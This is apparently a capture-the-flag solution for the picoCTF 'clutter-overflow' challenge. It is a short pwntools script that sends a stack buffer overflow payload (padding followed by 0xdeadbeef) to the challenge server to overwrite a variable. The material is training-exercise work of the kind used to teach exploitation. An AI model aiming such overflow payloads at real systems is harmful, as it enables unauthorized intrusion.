# clutter-overflow

```python
from pwn import *

r = process("./chall")
r = remote("mars.picoctf.net", 31890)
r.recvuntil(b"What do you see?")
r.sendline(b"A"*(0x110 - 0x8) + p64(0xdeadbeef))
r.recvall()
```
